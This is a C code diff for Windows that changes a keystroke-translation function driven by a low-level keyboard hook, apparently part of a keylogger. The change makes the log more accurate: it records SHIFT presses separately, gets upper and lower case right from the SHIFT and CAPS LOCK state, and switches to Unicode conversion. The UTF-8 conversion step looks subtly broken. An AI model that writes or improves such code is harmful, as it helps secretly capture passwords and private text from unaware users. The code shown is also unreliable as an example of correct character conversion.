@@ -16,15 +16,18 @@ void getCharFromKey(char *keyName, WPARAM wParam, LPARAM lParam){
     KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
     DWORD vkCode = kbStruct->vkCode;
 
+    // Check if it's a standalone SHIFT press
+    if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
+        strcpy(keyName, "[SHIFT]");
+        return;
+    }
+
     // Handle special keys first
     switch(vkCode){
         case VK_RETURN: strcpy(keyName,"[ENTER]\n"); break;
         case VK_SPACE:  strcpy(keyName," "); break;
         case VK_BACK:   strcpy(keyName,"[BACK]"); break;
         case VK_TAB:    strcpy(keyName,"[TAB]"); break;
-        case VK_SHIFT:   
-        case VK_LSHIFT:  
-        case VK_RSHIFT: strcpy(keyName,"[SHIFT]"); break;
         case VK_CONTROL: 
         case VK_LCONTROL: 
         case VK_RCONTROL:   strcpy(keyName,"[CTRL]"); break;
@@ -37,12 +40,25 @@ void getCharFromKey(char *keyName, WPARAM wParam, LPARAM lParam){
         case VK_DOWN:   strcpy(keyName,"[DOWN]"); break;
         default: {
             // Get keyboard state
-            BYTE keyboardState[256];
-            GetKeyboardState(keyboardState);
+            BYTE keyboardState[256] = {0};
+
+            // Check if SHIFT is pressed
+            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
+                keyboardState[VK_SHIFT] = 0x80;  // This will make ToUnicode give us uppercase
+            }
+            
+            // Check CAPS LOCK
+            if (GetKeyState(VK_CAPITAL) & 0x0001) {
+                keyboardState[VK_CAPITAL] = 0x01;
+            }
             
             // Convert virtual key to character
-            WORD character;
-            int result = ToAscii(vkCode, kbStruct->scanCode, keyboardState, &character, 0);
+            WCHAR unicodeChar;
+            int result = ToUnicode(vkCode, kbStruct->scanCode, keyboardState, &unicodeChar, 1, 0);
+
+            char character;
+            // Convert from UTF-16 (wide char) to UTF-8
+            WideCharToMultiByte(CP_UTF8, 0, &unicodeChar, -1, &character, 1, NULL, NULL );
 
             if(result == 1){
                 // printable character
